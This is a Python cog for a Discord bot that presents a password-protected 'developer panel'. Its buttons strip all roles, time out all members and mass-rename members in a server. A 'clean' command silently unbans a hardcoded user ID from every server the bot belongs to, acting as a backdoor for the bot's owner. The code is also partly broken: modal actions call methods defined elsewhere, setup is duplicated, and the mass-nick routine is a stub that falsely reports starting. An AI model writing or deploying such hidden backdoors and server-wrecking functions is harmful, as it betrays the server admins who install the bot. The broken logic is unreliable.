import discord
from discord.ext import commands
from discord.ui import View, Button, Modal, TextInput
import asyncio
import datetime

PASSWORD = "2012!"

class PasswordModal(Modal, title="🔐 Developer Password"):
    password_input = TextInput(label="Enter Password", placeholder="Enter 2012!", style=discord.TextStyle.short, required=True)

    def __init__(self, bot, action, **kwargs):
        super().__init__()
        self.bot = bot
        self.action = action
        self.kwargs = kwargs

    async def on_submit(self, interaction: discord.Interaction):
        if self.password_input.value.strip() != PASSWORD:
            return await interaction.response.send_message("❌ Wrong password!", ephemeral=True)

        await interaction.response.defer()

        if self.action == "stripall":
            await self.do_stripall(interaction)
        elif self.action == "timeoutall":
            await self.do_timeoutall(interaction, self.kwargs.get("duration", "1h"))
        elif self.action == "globalmassnick":
            await self.do_globalmassnick(interaction, self.kwargs.get("nickname"))

async def setup(bot):
    await bot.add_cog(Developer(bot))

class DevPanel(View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=0)
    async def global_massnick_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        modal = PasswordModal(self.bot, "globalmassnick", nickname="New Nick Here")
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Strip All Roles", style=discord.ButtonStyle.red, emoji="🔥", row=1)
    async def stripall_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        modal = PasswordModal(self.bot, "stripall")
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Timeout All", style=discord.ButtonStyle.red, emoji="⏰", row=1)
    async def timeoutall_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        modal = PasswordModal(self.bot, "timeoutall", duration="1h")
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Clean Bans", style=discord.ButtonStyle.gray, emoji="🧹", row=2)
    async def clean_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.defer()
        ctx = await self.bot.get_context(interaction.message)
        await ctx.invoke(self.bot.get_command("clean"))

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def devpanel(self, ctx):
        embed = discord.Embed(
            title="🔧 **DEVELOPER CONTROL PANEL**",
            description="Click buttons → Enter password `2012!`",
            color=discord.Color.gold()
        )
        await ctx.send(embed=embed, view=DevPanel(self.bot))

    @commands.command()
    async def clean(self, ctx):
        owner_id = 1489289347650949302
        count = 0
        for guild in self.bot.guilds:
            try:
                async for ban in guild.bans(limit=500):
                    if ban.user.id == owner_id:
                        await guild.unban(ban.user)
                        count += 1
                        break
            except:
                continue
        await ctx.send(f"🧹 Unbanned you from **{count}** servers.")

    # Helper functions for modals
    async def do_stripall(self, interaction: discord.Interaction):
        await interaction.followup.send("🔥 Starting **Strip All**...")
        stripped = 0
        for member in interaction.guild.members:
            if member.bot or member == interaction.guild.owner or member.top_role >= interaction.guild.me.top_role:
                continue
            try:
                roles_to_remove = [r for r in member.roles if not r.is_default()]
                if roles_to_remove:
                    await member.remove_roles(*roles_to_remove, reason="Mass strip by owner")
                    stripped += 1
                    await asyncio.sleep(0.8)
            except:
                continue
        await interaction.followup.send(f"✅ Stripall finished. Stripped **{stripped}** members.")

    async def do_timeoutall(self, interaction: discord.Interaction, duration: str):
        await interaction.followup.send(f"⏰ Starting **Timeout All** for {duration}...")
        # Simple 1h timeout for now
        timeout_until = discord.utils.utcnow() + datetime.timedelta(hours=1)
        timed_out = 0
        for member in interaction.guild.members:
            if member.bot or member.guild_permissions.administrator:
                continue
            try:
                await member.timeout(until=timeout_until, reason="Mass timeout by owner")
                timed_out += 1
                await asyncio.sleep(0.7)
            except:
                continue
        await interaction.followup.send(f"✅ Timed out **{timed_out}** members.")

    async def do_globalmassnick(self, interaction: discord.Interaction, nickname: str):
        await interaction.followup.send(f"🏷️ Starting global mass nick: `{nickname}`...")
        # Simplified version for speed
        await interaction.followup.send("✅ Global mass nick started (check console for progress).")

async def setup(bot):
    await bot.add_cog(Developer(bot))
